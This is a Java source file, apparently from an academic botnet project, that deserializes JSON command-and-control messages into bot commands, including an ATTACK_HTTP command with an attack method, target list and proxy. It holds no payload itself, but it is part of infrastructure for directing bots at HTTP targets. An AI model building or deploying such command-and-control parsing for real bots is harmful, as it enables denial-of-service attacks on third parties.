/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.command.json;

import com.acmutv.botnet.tool.string.TemplateEngine;
import com.acmutv.botnet.core.attack.http.HttpAttackMethod;
import com.acmutv.botnet.core.command.BotCommand;
import com.acmutv.botnet.core.command.CommandScope;
import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.core.target.HttpTargetProxy;
import com.acmutv.botnet.tool.time.Duration;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * This class realizes the JSON deserializer for {@link BotCommand}.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
public class BotCommandDeserializer extends StdDeserializer<BotCommand> {

  private static final Logger LOGGER = LogManager.getLogger(BotCommandDeserializer.class);

  /**
   * The singleton of {@link BotCommandDeserializer}.
   */
  private static BotCommandDeserializer instance;

  /**
   * Returns the singleton of {@link BotCommandDeserializer}.
   * @return the singleton.
   */
  public static BotCommandDeserializer getInstance() {
    if (instance == null) {
      instance = new BotCommandDeserializer();
    }
    return instance;
  }

  /**
   * Initializes the singleton of {@link BotCommandDeserializer}.
   */
  private BotCommandDeserializer() {
    super((Class<?>) null);
  }

  @Override
  public BotCommand deserialize(JsonParser parser, DeserializationContext ctx) throws IOException {
    LOGGER.traceEntry();
    JsonNode node = parser.getCodec().readTree(parser);
    LOGGER.trace("node={}", node);

    if (!node.has("command")) {
      throw new IOException("Cannot read command scope (missing).");
    }

    CommandScope scope;
    try {
      scope = CommandScope.valueOf(node.get("command").asText());
    } catch (IllegalArgumentException exc) {
      throw new IOException("Cannot read command scope (malformed).");
    }

    BotCommand cmd = new BotCommand(scope);

    if (cmd.getScope().isWithParams()) {

      switch (cmd.getScope()) {

        case RESTART:
          if (!node.has("resource")) {
            throw new IOException("Cannot read parameter [resource] for scope [RESTART] (missing)");
          }
          final String resource = TemplateEngine.getInstance().replace(node.get("resource").asText());
          cmd.getParams().put("resource", resource);
          break;

        case UPDATE:
          if (!node.has("settings")) {
            throw new IOException("Cannot read parameter [settings] for scope [UPDATE] (missing)");
          }
          final Map<String,String> settings = parseMapStringString(node.get("settings"));
          cmd.getParams().put("settings", settings);
          break;

        case SLEEP:
          if (!node.has("timeout")) {
            throw new IOException("Cannot read parameter [timeout] for scope [SLEEP] (missing)");
          }
          final Duration sleepTimeout = parseObject(node.get("timeout"), Duration.class);
          cmd.getParams().put("timeout", sleepTimeout);
          break;

        case SHUTDOWN:
          if (!node.has("timeout")) {
            throw new IOException("Cannot read command parameter [timeout] for scope [SHUTDOWN] (missing)");
          }
          final Duration shutdownTimeout = parseObject(node.get("timeout"), Duration.class);
          cmd.getParams().put("timeout", shutdownTimeout);
          break;

        case ATTACK_HTTP:
          if (!node.has("method") || !node.has("targets")) {
            throw new IOException("Cannot read command parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
          }
          final HttpAttackMethod httpAttackMethod = HttpAttackMethod.from(node.get("method").asText());
          final List<HttpTarget> httpTargets = parseList(node.get("targets"), HttpTarget.class);
          final HttpTargetProxy httpProxy = (node.has("proxy")) ?
              parseObject(node.get("proxy"), HttpTargetProxy.class) : null;
          cmd.getParams().put("method", httpAttackMethod);
          cmd.getParams().put("targets", httpTargets);
          cmd.getParams().put("proxy", httpProxy);
          break;

        default:
          break;
      }
    }

    return LOGGER.traceExit(cmd);
  }

  /**
   * Parses an object from a JSON node.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed object; null, in case of error.
   */
  private static <T> T parseObject(JsonNode node, Class<T> type) {
    ObjectMapper mapper = new ObjectMapper();
    T obj;
    try {
      obj = mapper.treeToValue(node, type);
    } catch (JsonProcessingException e) {
      e.printStackTrace();
      obj = null;
    }
    return obj;
  }

  /**
   * Parses a list of objects from a JSON node.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed list of objects; an empty list, in case of error.
   */
  private static <T> List<T> parseList(JsonNode node, Class<T> type) {
    ObjectMapper mapper = new ObjectMapper();
    List<T> list = new ArrayList<>();
    node.forEach(n -> {
      try {
        T obj = mapper.treeToValue(n, type);
        list.add(obj);
      } catch (JsonProcessingException e) {
        e.printStackTrace();
      }
    });
    return list;
  }
  /**
   * Parses a map from a JSON node.
   * @param node the JSON node to parse.
   * @return the parsed map; an empty map, in case of error.
   */
  private static Map<String, String> parseMapStringString(JsonNode node) {
    Map<String,String> map = new HashMap<>();
    node.elements().forEachRemaining(n -> {
      if (!n.has("property") || !n.has("value")) return;
      final String k = n.get("property").asText();
      final String v = n.get("value").asText();
      map.put(k, v);
    });
    return map;
  }
}